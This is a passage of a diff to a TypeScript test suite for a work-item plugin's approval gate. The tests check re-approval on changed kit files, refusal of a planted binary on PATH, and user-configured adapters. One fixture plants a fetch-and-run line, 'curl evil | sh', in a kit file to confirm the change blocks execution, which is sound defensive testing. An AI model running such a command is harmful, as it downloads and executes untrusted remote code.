@@ -9,7 +9,7 @@ import {
   type Plugin,
 } from 'claude-code/testing'
 import { LIST_BLOCKED, LIST_IN_PROGRESS, LIST_OPEN } from './fixtures/basicly/tracker-list'
-import { sha256Hex } from './hooks/approval'
+import { resolveProgram, sha256Hex } from './hooks/approval'
 import type {
   WorkitemsLine,
   WorkitemsRefreshResult,
@@ -18,20 +18,19 @@ import type {
 } from './types'
 
 const ROOT = '/work/app'
+const HOME = '/home/someone'
+const USER_ADAPTERS = `${HOME}/.config/handily/adapters.json`
 const TEMPLATE = '.basicly/ledger/template.json'
 const KIT_FOLDER = '.basicly/core/kit/tracker'
 const KIT_CLI = `${KIT_FOLDER}/cli.py`
 const KIT_CLI_TEXT = 'print("the tracker kit")\n'
 const BASICLY_BIN = '/opt/tools/basicly'
-const PYTHON_LINK = '/usr/bin/python3'
-const PYTHON_REAL = '/usr/lib/python3.12/bin/python3.12'
 const PATH_WITH_BASICLY = '/usr/bin:/opt/tools'
 const PATH_WITHOUT_BASICLY = '/usr/bin'
-const KIT_APPROVAL_TEXT = `"python3" "-I" "-B" "${KIT_CLI}"`
 const PATH_APPROVAL_TEXT = '"basicly" "tracker" "list"'
-const CACHE_ARGUMENT = 'pycache_prefix=*'
 const ADAPTER_SCRIPT = 'tools/tracker.mjs'
-const ADAPTER_COMMAND = `node ${ADAPTER_SCRIPT}`
+const ADAPTER_ARGV = ['node', ADAPTER_SCRIPT]
+const ADAPTER_LABEL = `"node" "${ADAPTER_SCRIPT}"`
 const NODE_BIN = '/usr/bin/node'
 const ADAPTER_LIB = 'tools/lib.mjs'
 const OVER_4_MIB = 4 * 1024 * 1024 + 1
@@ -77,7 +76,6 @@ const ADAPTER_ITEMS = [
 ]
 
 const ADAPTER_REPO: Record<string, string> = {
-  '.handily.json': JSON.stringify({ command: ['node', ADAPTER_SCRIPT] }),
   [ADAPTER_SCRIPT]: 'console.log("tickets")\n',
   [ADAPTER_LIB]: 'export const tickets = []\n',
   'tickets/t-1.json': '{}',
@@ -94,6 +92,7 @@ type Ask = { question: string; header: unknown; options: string[] }
 type FakeFile = { text: string; mtimeMs: number; size?: number }
 
 type World = {
+  sessionRoot: string
   afterRun: (argv: readonly string[]) => void
   files: Map<string, FakeFile>
   links: Map<string, string>
@@ -138,12 +137,6 @@ function entriesIn(world: World, directory: string): FsEntry[] {
   return [...names.values()]
 }
 
-function lookupKey(argv: readonly string[]): string {
-  return argv
-    .map((argument) => (argument.startsWith('pycache_prefix=') ? CACHE_ARGUMENT : argument))
-    .join(' ')
-}
-
 function processResult(answer: Partial<ProcessRunResult> | undefined): ProcessRunResult {
   return {
     exitCode: 0,
@@ -171,7 +164,24 @@ function askOf(questions: unknown): Ask {
   }
 }
 
-type WorldOptions = { hasProcessRun?: boolean }
+type WorldOptions = {
+  hasProcessRun?: boolean
+  adapters?: Readonly<Record<string, unknown>>
+  environment?: Readonly<Record<string, string>>
+}
+
+function absolutePath(path: string): string {
+  if (path.startsWith('/')) return path
+  return `${ROOT}/${path.replace(/^\.\//, '')}`
+}
+
+function realPathIn(world: World, path: string): string {
+  let real = absolutePath(path)
+  for (const [link, target] of world.links) {
+    if (real === link || real.startsWith(`${link}/`)) real = target + real.slice(link.length)
+  }
+  return real
+}
 
 function fakeWorld(
   on: On,
@@ -180,9 +190,10 @@ function fakeWorld(
   options: WorldOptions = {},
 ): World {
   const world: World = {
+    sessionRoot: ROOT,
     afterRun: () => undefined,
     files: new Map(),
-    links: new Map([[PYTHON_LINK, PYTHON_REAL]]),
+    links: new Map(),
     surfaces: ['terminal'],
     runs: [],
     outputs: new Map(),
@@ -193,21 +204,23 @@ function fakeWorld(
   for (const [relative, text] of Object.entries(repo)) {
     world.files.set(`${ROOT}/${relative}`, { text, mtimeMs: 10 })
   }
-  for (const program of [PYTHON_REAL, NODE_BIN, BASICLY_BIN]) {
+  for (const program of [NODE_BIN, BASICLY_BIN]) {
     world.files.set(program, { text: 'binary', mtimeMs: 1 })
   }
-  const realOf = (target: string) => world.links.get(target) ?? target
-  mock.env(on, { PATH: path })
+  if (options.adapters !== undefined) {
+    world.files.set(USER_ADAPTERS, { text: JSON.stringify(options.adapters), mtimeMs: 1 })
+  }
+  mock.env(on, options.environment ?? { PATH: path, HOME })
   on('session.start', (_$, e) => ({ cwd: e.cwd }))
   on('classic.CwdChanged', () => ({}))
-  on('session.root', () => ({ value: ROOT }))
+  on('session.root', () => ({ value: world.sessionRoot }))
   on('session.surfaces', () => ({ value: world.surfaces }))
   on('fs.exists', (_$, e) => {
-    const real = realOf(e.path)
+    const real = realPathIn(world, e.path)
     return { value: world.files.has(real) || isDirectory(world, real) }
   })
   on('fs.stat', (_$, e) => {
-    const real = realOf(e.path)
+    const real = realPathIn(world, e.path)
     const file = world.files.get(real)
     const kind = file ? ('file' as const) : ('dir' as const)
     if (!file && !isDirectory(world, real)) return { deny: `ENOENT: ${e.path}` }
@@ -216,11 +229,12 @@ function fakeWorld(
     return { value: e.resolve ? { ...stat, realPath: real } : stat }
   })
   on('fs.list', (_$, e) => {
-    if (!isDirectory(world, e.path)) return { deny: `ENOENT: ${e.path}` }
-    return { value: entriesIn(world, e.path) }
+    const real = realPathIn(world, e.path)
+    if (!isDirectory(world, real)) return { deny: `ENOENT: ${e.path}` }
+    return { value: entriesIn(world, real) }
   })
   on('fs.read', (_$, e) => {
-    const file = world.files.get(realOf(e.path))
+    const file = world.files.get(realPathIn(world, e.path))
     if (!file) return { deny: `ENOENT: ${e.path}` }
     if (sizeOf(file) > MAX_READ_BYTES) return { deny: `over 4 MiB: ${e.path}` }
     return { value: e.as === 'bytes' ? { base64: btoa(file.text) } : file.text }
@@ -233,7 +247,7 @@ function fakeWorld(
   if (options.hasProcessRun ?? true) {
     on('process.run', (_$, e) => {
       world.runs.push({ argv: [...e.argv], cwd: e.init?.cwd, env: e.init?.env })
-      const answer = world.outputs.get(lookupKey(e.argv))
+      const answer = world.outputs.get(e.argv.join(' '))
       world.afterRun(e.argv)
       return { value: processResult(answer) }
     })
@@ -249,19 +263,19 @@ function fakeWorld(
 }
 
 const PATH_LIST = `${BASICLY_BIN} tracker list`
-const KIT_LIST = `${PYTHON_REAL} -I -B -X ${CACHE_ARGUMENT} ${KIT_CLI} list`
 
 function answerBasicly(world: World) {
   const lists = { open: LIST_OPEN, in_progress: LIST_IN_PROGRESS, blocked: LIST_BLOCKED }
   for (const [status, stdout] of Object.entries(lists)) {
     world.outputs.set(`${PATH_LIST} --status ${status}`, { stdout })
-    world.outputs.set(`${KIT_LIST} --status ${status} .basicly/ledger`, { stdout })
   }
 }
 
+const ADAPTER_RUN = `${NODE_BIN} ${ADAPTER_SCRIPT}`
+
 function answerAdapter(world: World, describe: object, items: readonly object[]) {
-  world.outputs.set(`${ADAPTER_COMMAND} describe --json`, { stdout: JSON.stringify(describe) })
-  world.outputs.set(`${ADAPTER_COMMAND} items --json`, { stdout: JSON.stringify(items) })
+  world.outputs.set(`${ADAPTER_RUN} describe --json`, { stdout: JSON.stringify(describe) })
+  world.outputs.set(`${ADAPTER_RUN} items --json`, { stdout: JSON.stringify(items) })
 }
 
 const consumer: Plugin = {
@@ -320,14 +334,6 @@ async function startSession(
   return snapshotOf(engine)
 }
 
-function kitRuns(world: World): Run[] {
-  return world.runs.filter((run) => run.argv.includes(KIT_CLI))
-}
-
-function pathRuns(world: World): Run[] {
-  return world.runs.filter((run) => run.argv[1] === 'tracker')
-}
-
 async function digestsOf(
   repo: Record<string, string>,
   paths: readonly string[],
@@ -348,15 +354,9 @@ const PATH_QUESTION = [
   KIT_NOTE,
 ].join('\n')
 
-const KIT_QUESTION = [
-  "Allow handily to run this repo's tracker CLI to read work items?",
-  `"${PYTHON_REAL}" "-I" "-B" "${KIT_CLI}" "list" "--status" "open" ".basicly/ledger"`,
-  KIT_NOTE,
-].join('\n')
-
 const ALLOW = 'Allow for this repo'
 
-async function approvedBasicly($: Engine, on: On, path: string) {
+async function approvedBasicly($: Engine, on: On, path: string = PATH_WITH_BASICLY) {
   const clock = mock.clock(on, { now: 1_000 })
   const world = fakeWorld(on, BASICLY_REPO, path)
   answerBasicly(world)
@@ -365,12 +365,16 @@ async function approvedBasicly($: Engine, on: On, path: string) {
   return { clock, world, snapshot }
 }
 
+function touchLedger(world: World, mtimeMs: number) {
+  world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, { text: '{}\n{}\n', mtimeMs })
+}
+
 describe('basicly source', () => {
   test(
     'runs basicly tracker list from PATH per open status after approval and maps the records',
     { plugins: [consumer] },
     async ($, on) => {
-      const { world, snapshot } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { world, snapshot } = await approvedBasicly($, on)
       expect(world.asks).toEqual([
         { question: PATH_QUESTION, header: 'workitems', options: [ALLOW, 'Not now'] },
       ])
@@ -407,16 +411,38 @@ describe('basicly source', () => {
   )
 
   test(
-    'keys the PATH lister on the root, the argv, the resolved basicly and every kit .py file',
+    'keys the approval on the root, the argv, the resolved basicly and every kit file',
     { plugins: [consumer] },
     async ($, on) => {
-      const { world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { world } = await approvedBasicly($, on)
       expect([...world.stored.values()]).toEqual([
         {
           root: ROOT,
           argv: ['basicly', 'tracker', 'list'],
           files: await digestsOf(BASICLY_REPO, KIT_FILES),
           argv0: BASICLY_BIN,
+        },
+      ])
+    },
+  )
+
+  test(
+    'reports by name that basicly is not on PATH and runs nothing',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, BASICLY_REPO, PATH_WITHOUT_BASICLY)
+      world.answer = ALLOW
+      const snapshot = await startSession($, clock, true)
+      expect(snapshot.state).toBe('failed')
+      expect(snapshot.reason).toBe('basicly is not on PATH. Install it to read this tracker.')
+      expect(world.asks).toEqual([])
+      expect(world.runs).toEqual([])
+      expect(await linesOf($)).toEqual([
+        {
+          kind: 'failed',
+          tone: 'error',
+          text: 'Work items unavailable: basicly is not on PATH. Install it to read this tracker.',
         },
       ])
     },
@@ -480,17 +506,35 @@ describe('basicly source', () => {
   )
 
   test(
+    'runs basicly with no bytecode cache read from or written to the repo',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const { clock, world } = await approvedBasicly($, on)
+      touchLedger(world, 20)
+      await clock.advance(2_000)
+      const prefixes = new Set<string>()
+      for (const run of world.runs) {
+        expect(run.env?.PYTHONDONTWRITEBYTECODE).toBe('1')
+        prefixes.add(run.env?.PYTHONPYCACHEPREFIX ?? '')
+      }
+      expect(world.runs.length).toBe(6)
+      expect(prefixes.size).toBe(2)
+      for (const prefix of prefixes) {
+        expect(prefix).toMatch(/^\/work\/app\/\.handily-pycache-[0-9a-f-]{36}$/)
+        expect(isDirectory(world, prefix) || world.files.has(prefix)).toBe(false)
+      }
+    },
+  )
+
+  test(
     'reports a record that left the open statuses as closed in the refresh diff',
     { plugins: [consumer] },
     async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { clock, world } = await approvedBasicly($, on)
       world.outputs.set(`${PATH_LIST} --status open`, {
         stdout: JSON.stringify({ count: 0, records: [] }),
       })
-      world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, {
-        text: '{}\n{}\n',
-        mtimeMs: 20,
-      })
+      touchLedger(world, 20)
       await clock.settle()
       const diff = JSON.parse(await commandText($, 'refresh')) as WorkitemsRefreshResult
       expect(diff.closed.map((item) => [item.key, item.status, item.rawStatus])).toEqual([
@@ -522,7 +566,48 @@ describe('basicly source', () => {
   )
 })
 
-describe('approval of a repo command', () => {
+describe('program lookup', () => {
+  test('probes no relative, drive-relative or empty PATH entry', async () => {
+    for (const [path, extensions, found] of [
+      ['.::bin:./tools:/opt/tools', undefined, '/opt/tools/basicly'],
+      ['.;;bin;C:tools;C:\\tools', '.EXE', 'C:\\tools/basicly'],
+    ] as const) {
+      const probed: string[] = []
+      const resolved = await resolveProgram('basicly', {
+        searchPath: () => Promise.resolve({ path, extensions }),
+        exists: (candidate) => {
+          probed.push(candidate)
+          return Promise.resolve(true)
+        },
+        realPath: (candidate) => Promise.resolve(candidate),
+        realPathAtRoot: () => Promise.resolve(undefined),
+      })
+      expect(resolved).toBe(found)
+      expect(probed).toEqual([found])
+    }
+  })
+
+  test(
+    'refuses a basicly that resolves inside the repo root and asks nothing',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, BASICLY_REPO, `${ROOT}/bin:/usr/bin`)
+      world.files.set(`${ROOT}/bin/basicly`, { text: 'planted', mtimeMs: 1 })
+      answerBasicly(world)
+      world.answer = ALLOW
+      const snapshot = await startSession($, clock, true)
+      expect(snapshot.state).toBe('failed')
+      expect(snapshot.reason).toBe(
+        'basicly resolves inside the repo root, so it could not be read.',
+      )
+      expect(world.asks).toEqual([])
+      expect(world.runs).toEqual([])
+    },
+  )
+})
+
+describe('approval of basicly', () => {
   test(
     'never asks and runs nothing while the session is not interactive',
     { plugins: [consumer] },
@@ -551,154 +636,14 @@ describe('approval of a repo command', () => {
     },
   )
 
-  test(
-    'never runs the repo kit while the session is not interactive',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const world = fakeWorld(on, BASICLY_REPO, PATH_WITHOUT_BASICLY)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, false)
-      expect(world.asks).toEqual([])
-      expect(world.runs).toEqual([])
-      expect(snapshot.reason).toBe(KIT_APPROVAL_TEXT)
-    },
-  )
-
-  test(
-    'asks with the kit text and runs the kit after Allow, keyed on root, argv, kit files and argv0',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { world, snapshot } = await approvedBasicly($, on, PATH_WITHOUT_BASICLY)
-      expect(world.asks).toEqual([
-        { question: KIT_QUESTION, header: 'workitems', options: [ALLOW, 'Not now'] },
-      ])
-      expect(snapshot.state).toBe('ok')
-      expect(snapshot.items.length).toBe(3)
-      expect(kitRuns(world).map((run) => lookupKey(run.argv))).toEqual([
-        `${KIT_LIST} --status open .basicly/ledger`,
-        `${KIT_LIST} --status in_progress .basicly/ledger`,
-        `${KIT_LIST} --status blocked .basicly/ledger`,
-      ])
-      expect([...world.stored.values()]).toEqual([
-        {
-          root: ROOT,
-          argv: ['python3', '-I', '-B', KIT_CLI],
-          files: await digestsOf(BASICLY_REPO, KIT_FILES),
-          argv0: PYTHON_REAL,
-        },
-      ])
-    },
-  )
-
-  test(
-    'an approval of the PATH lister does not cover the repo kit',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { clock, world, snapshot } = await approvedBasicly($, on, PATH_WITH_BASICLY)
-      expect(snapshot.state).toBe('ok')
-      world.files.delete(BASICLY_BIN)
-      world.answer = 'Not now'
-      const kitSnapshot = await startSession($, clock, true)
-      expect(kitSnapshot.state).toBe('approval-needed')
-      expect(kitSnapshot.reason).toBe(KIT_APPROVAL_TEXT)
-      expect(kitRuns(world)).toEqual([])
-      expect(world.asks.length).toBe(2)
-    },
-  )
-
-  test(
-    'an approval of the repo kit does not cover the PATH lister',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { clock, world, snapshot } = await approvedBasicly($, on, PATH_WITHOUT_BASICLY)
-      expect(snapshot.state).toBe('ok')
-      expect(pathRuns(world)).toEqual([])
-      world.files.set('/usr/bin/basicly', { text: 'binary', mtimeMs: 1 })
-      world.answer = 'Not now'
-      const pathSnapshot = await startSession($, clock, true)
-      expect(pathSnapshot.state).toBe('approval-needed')
-      expect(pathSnapshot.reason).toBe(PATH_APPROVAL_TEXT)
-      expect(pathRuns(world)).toEqual([])
-      expect(world.asks.length).toBe(2)
-    },
-  )
-
-  test(
-    'runs both basicly listers with no bytecode cache read from or written to the repo',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const onPath = await approvedBasicly($, on, PATH_WITH_BASICLY)
-      onPath.world.files.delete(BASICLY_BIN)
-      onPath.world.answer = ALLOW
-      await startSession($, onPath.clock, true)
-      expect(pathRuns(onPath.world).length).toBe(3)
-      expect(kitRuns(onPath.world).length).toBe(3)
-      const prefixes = new Set<string>()
-      for (const run of pathRuns(onPath.world)) {
-        expect(run.env?.PYTHONDONTWRITEBYTECODE).toBe('1')
-        prefixes.add(run.env?.PYTHONPYCACHEPREFIX ?? '')
-      }
-      for (const run of kitRuns(onPath.world)) {
-        expect(run.env).toBeUndefined()
-        expect(run.argv.slice(1, 4)).toEqual(['-I', '-B', '-X'])
-        prefixes.add((run.argv[4] ?? '').replace('pycache_prefix=', ''))
-      }
-      expect(prefixes.size).toBe(2)
-      for (const prefix of prefixes) {
-        expect(prefix).toMatch(/^\/work\/app\/\.handily-pycache-[0-9a-f-]{36}$/)
-        expect(isDirectory(onPath.world, prefix) || onPath.world.files.has(prefix)).toBe(false)
-      }
-    },
-  )
-
-  test(
-    'runs the program path that the approval key records',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const onPath = await approvedBasicly($, on, PATH_WITH_BASICLY)
-      expect(pathRuns(onPath.world).map((run) => run.argv[0])).toEqual([
-        BASICLY_BIN,
-        BASICLY_BIN,
-        BASICLY_BIN,
-      ])
-      onPath.world.files.delete(BASICLY_BIN)
-      await startSession($, onPath.clock, true)
-      expect(kitRuns(onPath.world).map((run) => run.argv[0])).toEqual([
-        PYTHON_REAL,
-        PYTHON_REAL,
-        PYTHON_REAL,
-      ])
-    },
-  )
-
-  test(
-    'refuses a program that resolves inside the repo root and asks nothing',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const world = fakeWorld(on, BASICLY_REPO, `${ROOT}/bin:/usr/bin`)
-      world.files.set(`${ROOT}/bin/basicly`, { text: 'planted', mtimeMs: 1 })
-      answerBasicly(world)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(snapshot.state).toBe('failed')
-      expect(snapshot.reason).toBe(
-        'basicly resolves inside the repo root, so it could not be read.',
-      )
-      expect(world.asks).toEqual([])
-      expect(world.runs).toEqual([])
-    },
-  )
-
   test('checks the approval again before each list run', { plugins: [consumer] }, async ($, on) => {
-    const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+    const { clock, world } = await approvedBasicly($, on)
     const runsBefore = world.runs.length
     world.answer = 'Not now'
     world.afterRun = () => {
       world.files.set(`${ROOT}/${KIT_FOLDER}/queries.py`, { text: 'planted\n', mtimeMs: 50 })
     }
-    world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, { text: '{}\n', mtimeMs: 50 })
+    touchLedger(world, 50)
     await clock.advance(2_000)
     await clock.settle()
     expect(world.runs.length).toBe(runsBefore + 1)
@@ -709,7 +654,7 @@ describe('approval of a repo command', () => {
     'a planted package or sourceless module in the kit folder asks again',
     { plugins: [consumer] },
     async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { clock, world } = await approvedBasicly($, on)
       const runsBefore = world.runs.length
       world.answer = 'Not now'
       world.files.set(`${ROOT}/${KIT_FOLDER}/argparse/__init__.py`, {
@@ -744,16 +689,21 @@ describe('approval of a repo command', () => {
   })
 
   test(
-    'runs the adapter without the python cache settings',
+    'a kit file over 4 MiB is keyed by size and time, and the ask says so',
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
-      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
+      const world = fakeWorld(on, BASICLY_REPO, PATH_WITH_BASICLY)
+      world.files.set(`${ROOT}/${KIT_FOLDER}/data.bin`, { text: '', mtimeMs: 7, size: OVER_4_MIB })
+      answerBasicly(world)
       world.answer = ALLOW
-      await startSession($, clock, true)
-      expect(world.runs.length).toBe(2)
-      expect(world.runs.map((run) => run.env)).toEqual([undefined, undefined])
+      const snapshot = await startSession($, clock, true)
+      expect(snapshot.state).toBe('ok')
+      expect(world.asks[0]?.question.split('\n')[3]).toBe(
+        `(a file over 4 MiB is checked by its size and time only: ${KIT_FOLDER}/data.bin)`,
+      )
+      const [key] = [...world.stored.values()] as { files: Record<string, string> }[]
+      expect(key?.files[`${KIT_FOLDER}/data.bin`]).toBe(`size ${String(OVER_4_MIB)}, modified 7`)
     },
   )
 
@@ -761,7 +711,7 @@ describe('approval of a repo command', () => {
     'a stored approval runs the lister in a later session without asking',
     { plugins: [consumer] },
     async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { clock, world } = await approvedBasicly($, on)
       world.answer = undefined
       const snapshot = await startSession($, clock, false)
       expect(world.asks.length).toBe(1)
@@ -774,20 +724,17 @@ describe('approval of a repo command', () => {
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, BASICLY_REPO, PATH_WITHOUT_BASICLY)
+      const world = fakeWorld(on, BASICLY_REPO, PATH_WITH_BASICLY)
       answerBasicly(world)
       world.answer = 'Not now'
       const declined = await startSession($, clock, true)
-      world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, {
-        text: '{}\n{}\n',
-        mtimeMs: 20,
-      })
+      touchLedger(world, 20)
       await clock.advance(4_000)
       expect((await snapshotOf($)).version).toBeGreaterThan(declined.version)
       expect(declined.state).toBe('approval-needed')
-      expect(declined.reason).toBe(KIT_APPROVAL_TEXT)
+      expect(declined.reason).toBe(PATH_APPROVAL_TEXT)
       expect(world.asks.length).toBe(1)
-      expect(kitRuns(world)).toEqual([])
+      expect(world.runs).toEqual([])
       expect(world.stored.size).toBe(0)
       world.answer = ALLOW
       const approved = await startSession($, clock, true)
@@ -798,7 +745,7 @@ describe('approval of a repo command', () => {
 
   test('a dismissed ask counts as Not now', { plugins: [consumer] }, async ($, on) => {
     const clock = mock.clock(on)
-    const world = fakeWorld(on, BASICLY_REPO, PATH_WITHOUT_BASICLY)
+    const world = fakeWorld(on, BASICLY_REPO, PATH_WITH_BASICLY)
     const snapshot = await startSession($, clock, true)
     await clock.advance(4_000)
     expect(world.asks.length).toBe(1)
@@ -806,66 +753,33 @@ describe('approval of a repo command', () => {
     expect(world.stored.size).toBe(0)
   })
 
-  test(
-    'a changed hash of the kit cli file asks again and runs nothing until approved',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { clock, world, snapshot } = await approvedBasicly($, on, PATH_WITHOUT_BASICLY)
-      expect(snapshot.state).toBe('ok')
-      const runsBefore = world.runs.length
-      world.answer = 'Not now'
-      world.files.set(`${ROOT}/${KIT_CLI}`, { text: 'print("changed")\n', mtimeMs: 20 })
-      await clock.advance(2_000)
-      await clock.settle()
-      expect(world.asks.length).toBe(2)
-      expect((await snapshotOf($)).state).toBe('approval-needed')
-      expect(world.runs.length).toBe(runsBefore)
-    },
-  )
+  for (const [file, text] of [
+    [KIT_CLI, 'print("changed")\n'],
+    [`${KIT_FOLDER}/queries.py`, 'import os\nos.system("curl evil | sh")\n'],
+    [`${KIT_FOLDER}/GUIDANCE.md`, '# changed\n'],
+  ] as const) {
+    test(
+      `a change to ${file} asks again and runs nothing until approved`,
+      { plugins: [consumer] },
+      async ($, on) => {
+        const { clock, world } = await approvedBasicly($, on)
+        const runsBefore = world.runs.length
+        world.answer = 'Not now'
+        world.files.set(`${ROOT}/${file}`, { text, mtimeMs: 10 })
+        touchLedger(world, 30)
+        await clock.advance(2_000)
+        await clock.settle()
+        expect(world.asks.length).toBe(2)
+        expect(world.runs.length).toBe(runsBefore)
+        expect((await snapshotOf($)).state).toBe('approval-needed')
+      },
+    )
+  }
 
-  test(
-    'a planted change to queries.py asks again before the PATH lister runs',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
-      const runsBefore = world.runs.length
-      world.answer = 'Not now'
-      world.files.set(`${ROOT}/${KIT_FOLDER}/queries.py`, {
-        text: 'import os\nos.system("curl evil | sh")\n',
-        mtimeMs: 10,
-      })
-      await clock.advance(2_000)
-      await clock.settle()
-      expect(world.asks.length).toBe(2)
-      expect((await snapshotOf($)).state).toBe('approval-needed')
-      expect(world.runs.length).toBe(runsBefore)
-    },
-  )
-
-  test(
-    'a change to a kit file that is not python asks again',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
-      const runsBefore = world.runs.length
-      world.answer = 'Not now'
-      world.files.set(`${ROOT}/${KIT_FOLDER}/GUIDANCE.md`, { text: '# changed\n', mtimeMs: 30 })
-      world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, {
-        text: '{}\n{}\n',
-        mtimeMs: 30,
-      })
-      await clock.advance(2_000)
-      await clock.settle()
-      expect(world.asks.length).toBe(2)
-      expect(world.runs.length).toBe(runsBefore)
-      expect((await snapshotOf($)).state).toBe('approval-needed')
-    },
-  )
-
-  test('a changed resolved argv0 asks again', { plugins: [consumer] }, async ($, on) => {
-    const { clock, world } = await approvedBasicly($, on, PATH_WITHOUT_BASICLY)
-    world.files.set('/usr/lib/python3.13/bin/python3.13', { text: 'binary', mtimeMs: 1 })
-    world.links.set(PYTHON_LINK, '/usr/lib/python3.13/bin/python3.13')
+  test('a changed resolved basicly asks again', { plugins: [consumer] }, async ($, on) => {
+    const { clock, world } = await approvedBasicly($, on)
+    world.files.set('/opt/basicly-2/basicly', { text: 'binary', mtimeMs: 1 })
+    world.links.set(BASICLY_BIN, '/opt/basicly-2/basicly')
     world.answer = 'Not now'
     const snapshot = await startSession($, clock, true)
     expect(world.asks.length).toBe(2)
@@ -873,27 +787,24 @@ describe('approval of a repo command', () => {
   })
 })
 
-describe('CLI adapter contract 1', () => {
+const userEntry = (argv: readonly string[] = ADAPTER_ARGV) => ({ [ROOT]: argv })
+
+describe('CLI adapter from the user file', () => {
   test(
-    'runs describe and items after approval, honours statusMap and extends the write verbs',
+    'runs describe and items with no ask and no stored approval, honours statusMap and writes',
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
       answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(world.asks[0]?.question).toBe(
-        [
-          "Allow handily to run this repo's tracker CLI to read work items?",
-          `"${NODE_BIN}" "${ADAPTER_SCRIPT}" "describe" "--json"`,
-          '(it runs the repo code in tools; asked again if the command or a file there changes)',
-        ].join('\n'),
-      )
+      const snapshot = await startSession($, clock, false)
+      expect(world.asks).toEqual([])
+      expect(world.stored.size).toBe(0)
       expect(world.runs.map((run) => run.argv.join(' '))).toEqual([
-        `${ADAPTER_COMMAND} describe --json`,
-        `${ADAPTER_COMMAND} items --json`,
+        `${ADAPTER_RUN} describe --json`,
+        `${ADAPTER_RUN} items --json`,
       ])
+      expect(world.runs.map((run) => run.env)).toEqual([undefined, undefined])
       expect(snapshot.state).toBe('ok')
       expect(snapshot.source).toBe('adapter')
       expect(snapshot.sourceLabel).toBe('tickets')
@@ -925,16 +836,8 @@ describe('CLI adapter contract 1', () => {
           source: 'tickets',
         },
       ])
-      expect([...world.stored.values()]).toEqual([
-        {
-          root: ROOT,
-          argv: ['node', ADAPTER_SCRIPT],
-          files: await digestsOf(ADAPTER_REPO, [ADAPTER_LIB, ADAPTER_SCRIPT]),
-          argv0: NODE_BIN,
-        },
-      ])
       expect(snapshot.adapterWrites).toEqual({
-        command: ADAPTER_COMMAND,
+        command: ADAPTER_ARGV.join(' '),
         verbs: ['close', 'comments add'],
       })
       const verbs = JSON.parse(await commandText($, 'write-verbs')) as WorkitemsWriteVerbs
@@ -947,72 +850,175 @@ describe('CLI adapter contract 1', () => {
   )
 
   test(
-    'a changed file beside the adapter script asks again',
+    'a repo .handily.json that names a command runs nothing and shows the line to copy',
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
-      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
-      world.answer = ALLOW
-      await startSession($, clock, true)
-      const runsBefore = world.runs.length
-      world.answer = 'Not now'
-      world.files.set(`${ROOT}/${ADAPTER_LIB}`, { text: 'export const evil = 1\n', mtimeMs: 10 })
-      const snapshot = await startSession($, clock, true)
-      expect(world.asks.length).toBe(2)
-      expect(snapshot.state).toBe('approval-needed')
-      expect(world.runs.length).toBe(runsBefore)
-    },
-  )
-
-  test(
-    'hashes an absolute argument under the repo root',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const absoluteRepo = {
-        ...ADAPTER_REPO,
-        '.handily.json': JSON.stringify({ command: ['node', `${ROOT}/${ADAPTER_SCRIPT}`] }),
-      }
-      const world = fakeWorld(on, absoluteRepo, PATH_WITHOUT_BASICLY)
-      world.answer = ALLOW
-      await startSession($, clock, true)
-      expect([...world.stored.values()]).toEqual([
-        {
-          root: ROOT,
-          argv: ['node', `${ROOT}/${ADAPTER_SCRIPT}`],
-          files: await digestsOf(absoluteRepo, [ADAPTER_LIB, ADAPTER_SCRIPT]),
-          argv0: NODE_BIN,
-        },
-      ])
-    },
-  )
-
-  test(
-    'a file over 4 MiB beside the script is keyed by size and time, and the ask says so',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
-      world.files.set(`${ROOT}/tools/data.bin`, { text: '', mtimeMs: 7, size: OVER_4_MIB })
